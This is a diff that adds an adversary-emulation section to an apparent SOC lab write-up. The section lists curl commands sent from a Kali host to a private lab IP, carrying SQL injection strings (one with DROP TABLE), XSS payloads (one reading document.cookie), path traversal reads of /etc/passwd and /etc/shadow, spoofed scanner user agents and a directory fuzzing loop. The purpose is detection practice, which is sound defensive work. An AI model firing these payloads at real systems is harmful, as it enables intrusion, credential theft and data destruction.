@@ -64,6 +64,42 @@ index=web sourcetype=access_combined
 | sort - "Timestamp"
 ```
 
+### Adversary Emulation & Reproduction Commands
+
+To reproduce the attack traffic within the controlled SOC laboratory, the adversary executed the following multi-vector simulation suite from Kali Linux (`192.168.100.6`) targeting `ubuntu-p3` (`192.168.100.9`):
+
+```bash
+# 1. SQL Injection (SQLi) Probes
+curl -s "http://192.168.100.9/?id=1'+OR+'1'='1"
+curl -s "http://192.168.100.9/search?q=1;+DROP+TABLE+users;--"
+curl -s "http://192.168.100.9/api?category=books'+ORDER+BY+10--"
+
+# 2. Cross-Site Scripting (XSS) Payloads
+curl -s "http://192.168.100.9/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
+curl -s "http://192.168.100.9/profile?bio=<script>alert('pwned')</script>"
+curl -s "http://192.168.100.9/comment?msg=%3Cimg+src=x+onerror=alert(document.cookie)%3E"
+curl -s "http://192.168.100.9/feedback?text=<svg/onload=alert(1)>"
+
+# 3. Path Traversal & LFI Attempts
+curl -s "http://192.168.100.9/download.php?file=../../../../etc/passwd"
+curl -s "http://192.168.100.9/view?page=..%2f..%2f..%2fetc%2fshadow"
+curl -s "http://192.168.100.9/include?file=../../../../windows/win.ini"
+
+# 4. Automated Vulnerability Scanners
+curl -s -A "Nikto/2.1.6" "http://192.168.100.9/test/"
+curl -s -A "sqlmap/1.6.12#stable" "http://192.168.100.9/login"
+curl -s -A "gobuster/3.1.0" "http://192.168.100.9/admin"
+curl -s -A "DirBuster-1.0-RC1" "http://192.168.100.9/config"
+curl -s -A "Nmap Scripting Engine" "http://192.168.100.9/"
+
+# 5. Directory Fuzzing Sweep (generates 404 error spikes)
+for dir in admin login config backup db test shell private secrets dev staging wp-admin phpmyadmin server-status api; do
+  curl -s -o /dev/null "http://192.168.100.9/$dir"
+done
+
+echo "[✔] All Attack Vectors Fired Successfully!"
+```
+
 ### Adversary Execution & Raw Web Server Responses
 
 During the simulated engagement, the adversary executed XSS payloads directly against the web application endpoints. Apache 2.4 responded with HTTP 404 status codes as preserved in the terminal session:
